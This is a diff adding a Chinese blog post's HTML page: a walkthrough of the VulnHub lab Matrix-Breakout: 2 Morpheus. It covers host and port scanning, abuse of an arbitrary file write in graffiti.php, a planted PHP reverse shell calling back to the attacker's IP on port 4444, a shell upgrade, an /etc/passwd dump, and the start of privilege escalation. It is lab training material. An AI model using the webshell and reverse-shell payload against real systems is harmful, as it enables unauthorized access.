@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Matrix-Breakout: 2 Morpheus">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/04/13/Matrix-Breakout%202%20Morpheus/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-13T08:32:11.000Z">
+<meta property="article:modified_time" content="2024-04-13T10:51:27.361Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub 靶场">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/04/13/Matrix-Breakout%202%20Morpheus/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/04/13/Matrix-Breakout%202%20Morpheus/","path":"2024/04/13/Matrix-Breakout 2 Morpheus/","title":"Matrix-Breakout: 2 Morpheus"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Matrix-Breakout: 2 Morpheus | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E5%85%85binwalk"><span class="nav-text">2.3. 补充（binwalk）</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">116</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/04/13/Matrix-Breakout%202%20Morpheus/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Matrix-Breakout: 2 Morpheus | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Matrix-Breakout: 2 Morpheus
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-04-13 16:32:11 / 修改时间：18:51:27" itemprop="dateCreated datePublished" datetime="2024-04-13T16:32:11+08:00">2024-04-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">Matrix-Breakout:
+2 Morpheus ~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts      </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240             </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.  </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.148 00:0c:29:a0:a4:2c      1      60  VMware, Inc.    </span><br><span class="line">192.168.159.254 00:50:56:f6:f9:f3      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
+<p>靶机 IP：192.168.159.148</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-12 22:48 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.148</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-title: Morpheus:1</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">81/tcp open  http    nginx 1.18.0</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Meeting Place</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">MAC Address: 00:0C:29:A0:A4:2C (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.41 ms 192.168.159.148</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.65 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 没注意到有价值信息，81 需要登录</p>
+<p>80 主页的 trinity.jpeg 图片没找到隐写信息</p>
+<p>扫下 80 目录</p>
+<p>默认字典扫到个 /robots.txt</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There&#x27;s <span class="keyword">no</span> white rabbit here.  <span class="keyword">Keep</span> searching!</span><br></pre></td></tr></table></figure>
+<p>没价值……</p>
+<p>81 也没扫到啥……换字典，加后缀</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.159.148/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json -f</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.159.148/</span><br><span class="line"></span><br><span class="line">[23:20:34] Starting: </span><br><span class="line">[23:20:35] 403 -  280B  - /icons/                                          </span><br><span class="line">[23:20:52] 403 -  280B  - /javascript/                                     </span><br><span class="line">[23:20:52] 301 -  323B  - /javascript  -&gt;  http://192.168.159.148/javascript/</span><br><span class="line">[23:21:03] 200 -   47B  - /robots.txt                                      </span><br><span class="line">[23:25:13] 200 -  139B  - /graffiti.txt                                     </span><br><span class="line">[23:25:13] 200 -  451B  - /graffiti.php                                     </span><br><span class="line">[23:54:28] 403 -  280B  - /server-status </span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+<p>访问 /graffiti.php 和 /graffiti.txt 发现前者读取了后者</p>
+<p>经测试 Post 的 Message 会写入 graffiti.txt</p>
+<p>源码发现隐藏信息， POST 提交 Message 时会指定 file : graffiti.txt</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">Enter message: </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">value</span>=<span class="string">&quot;graffiti.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用 bp 换个文件试试</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131718173.png" /></p>
+<p>graffiti.php 也可以读写，可见 graffiti.php 内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="string">&quot;graffiti.txt&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;  </span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;  </span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Cannot open file: &#x27;</span> . <span class="variable">$file</span>);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="string">&quot;\n&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Display file  </span></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&quot;r&quot;</span>);  </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$handle</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  </span></span><br><span class="line"><span class="string">\n&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>直接往 graffiti.php 写个反弹 shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">echo</span> shell_working; </span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php -r \&#x27;$sock=fsockopen(&quot;192.168.159.152&quot;,&quot;4444&quot;);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131722334.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131723597.png" /></p>
+<p>操作起来不舒服！完善：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br><span class="line">export TERM=xterm </span><br><span class="line"><span class="comment"># 按下 Ctrl+z 退出 nc </span></span><br><span class="line">stty raw -echo;fg </span><br><span class="line"><span class="comment"># 输入reset </span></span><br><span class="line">stty rows <span class="number">46</span> columns <span class="number">188</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131723598.png" /></p>
+<p>读到一个 flag</p>
+<p>下载 .cypher-neo.png ，没找到隐写信息，暂留</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">nginx:x:999:999:nginx:/var/nginx:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">messagebus:x:101:101::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:102:102::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:103:103::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_chrony:x:104:104:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:105:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:106:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">sshd:x:107:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">trinity:x:1000:1000::/home/trinity:/bin/bash</span><br><span class="line">cypher:x:1001:1001::/home/cypher:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>可能要切换到 cypher 或 trinity 用户，找找可提权信息</p>
+<h3 id="提权">2.2. 提权</h3>
+<p>在 /var/nginx/html 下找到个 <code>.htpasswd</code> ，查了下
+/var/log/nginx 日志，这正是 81 端口登录认真密码</p>
